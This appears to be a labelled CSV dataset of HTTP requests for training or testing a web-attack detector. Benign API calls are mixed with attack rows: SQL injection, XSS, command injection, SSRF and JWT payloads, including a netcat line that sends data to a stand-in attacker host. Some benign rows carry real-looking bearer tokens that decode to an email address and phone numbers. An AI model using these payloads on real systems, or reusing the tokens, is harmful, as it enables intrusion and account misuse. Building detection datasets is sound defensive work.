method,path,query,headers,body,ua,label
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,GET /api/v1/ping,,,0
GET,/,,GET /auth/google/callback,,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,GET /settings/security,,,0
GET,/,,POST /register (detailed user info),,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,`uname -a`,,,1
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,GET /health,,,0
GET,/favicon.ico,,,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,POST /auth/password-reset-request,,,0
POST,/,,Host: example.com; Accept: */*,username=user919&password=pass310,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,OPTIONS /api/v1/data,,,0
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/bo/merchants/vnshop/list,filter=%7B%22limit%22%3A10%2C%22order%22%3A%5B%22id%20DESC%22%5D%2C%22offset%22%3A0%2C%22where%22%3A%7B%7D%7D,"Accept: application/json; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwcm92aWRlciI6IjMwU0VMTEVSX0NFTlRFUiIsInBob25lIjoiMDMyMTQ1Njc4OSIsInVzZXItaWQiOiI0MjQiLCJyb2xlcyI6IjAwNyIsImZ1bGxuYW1lIjoixJDhu5cgVGjhu4sgVGjDuXkgRMawxqFuZyIsInR5cGUiOiIxMFZOU0hPUCIsIm1lcmNoYW50cyI6IiIsImVtYWlsIjoiZHVvbmdkdHRAdm5wYXkudm4iLCJ1c2VybmFtZSI6ImR1b25nZHR0Iiwic3ViIjoiZHVvbmdkdHRAdm5wYXkudm4iLCJpYXQiOjE3NzA2OTAxNTIsImV4cCI6MTc3MDY5ODc5Mn0.rjRpQ214qBC_3pF5Y8vFvkpx2ZrEhqw3eeSw9IN-KAg; Connection: keep-alive; Content-Type: application/json; Host: apigw-pilot.vnshop.vn; Origin: https://admin.vnshop.vn; Referer: https://admin.vnshop.vn/; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Google Chrome"";v=""144""; Sec-Ch-Ua-Mobile: ?0; Sec-Ch-Ua-Platform: ""Windows""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-site; Source: bo-private; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36; X-Request-Id: 7a28567c-e66b-4ee1-8c24-ba7cba569320; X-Xss-Protection: 1; mode=block",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,`uname -a`,,,1
GET,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,|| ls -la,,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,GET /api/v1/products,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,<body onload=alert(1)>,,,1
PUT,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,__proto__[admin]=true,,,1
GET,/,,Host: evil.com,,,1
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,GET /auth/logout/confirm,,,0
POST,/search,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nmap Scripting Engine,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/search,q=' OR 1=1--,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/favicon.ico,,,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,GET /,,,0
GET,/wp-admin/admin-ajax.php,action=woof_draw_products&woof_redraw_elements[]=<img%20src=x%20onerror=alert(document.domain)>,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0,,Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0,1
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,; cat /etc/passwd,,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/favicon.ico,,,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,${os.system('id')},,,1
DELETE,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,id=1&id=2,,,1
GET,/,,%0als,,,1
GET,/oauth/idp/logout,post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,GET /manifest.json,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/favicon.ico,,,,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nikto/2.1.6,1
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /auth/google/callback,,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,GET /settings/security,,,0
GET,/,,|| ls -la,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
GET,/,,php://input,,,1
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /login,,,0
GET,/payform.php,type=upgrade&upgradeid=1&upgradegd=6&price=123&t=1&note=%3C/textarea%3E%3Cscript%3Ealert(document.domain)%3C/script%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,GET /login,,,0
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user575&password=pass185,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,id=1&id=2,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/web-api/orders/e91611fc-138c-46c8-b669-a3ee6360642a,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3Nzc0NjE4MjkiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZmI3YWY0N2YtM2ExOC00YmY1LTljZDktM2YyOWQ3OTcwOGRmIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3Nzc0NjE4MjkiLCJzdWIiOiJXRUJTSVRFQDA3Nzc0NjE4MjkiLCJpYXQiOjE3NzA2MzAyMTUsImV4cCI6MTc3MTIzNTAxNX0.Dnq0Z31CaIcLQPrYpVyMGjeZ1g4zjWquY7hcjnB8I5s; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 943a8f36-4e56-4064-8eb0-d00d1a673044",,python-requests/2.32.5,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,javascript:alert(1),,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /manifest.json,,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,OPTIONS /api/v1/data,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,curl/7.68.0,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,java\tscript:alert(1),,,1
PUT,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,javascript:alert(1),,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
DELETE,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user828&password=pass84,Mozilla/5.0 (Linux; Android 11),0
GET,/search,q=../../../../etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,$(whoami),,,1
GET,/favicon.ico,,,,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /settings/security,,,0
GET,/,,http://127.0.0.1:22,,,1
GET,/,,POST /api/v1/login (username/password),,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/,,java\tscript:alert(1),,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,GET /favicon.ico,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,GET /,,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,; cat /etc/passwd,,,1
GET,/login,q=<img src=x onerror=alert(1)>,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,javascript:alert(1),,,1
GET,/,,java\tscript:alert(1),,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/favicon.ico,,,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/login.php,"secret=""><script>alert(document.domain)</script>","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/favicon.ico,,,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/index.php,debug_host=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&start_debug=1,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/api/v1/users,q=admin'--,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /search?q=machine+learning,,,0
POST,/home,,Host: example.com; Accept: */*,username=user612&password=pass622,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /user/profile,,,0
GET,/favicon.ico,,,,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/shop/products,category=cordless-tools&min=1026553%3balert(document.domain)%2f%2f772,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,GET /search?q=security,,,0
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,id=1; DROP TABLE users--,,,1
GET,/api/v1/users,q=| cat /etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,javascript:alert(1),,,1
GET,/,,GET /search?q=security,,,0
PUT,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /search?q=1+1=2,,,0
POST,/login,,Host: example.com; Accept: */*,username=user766&password=pass116,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
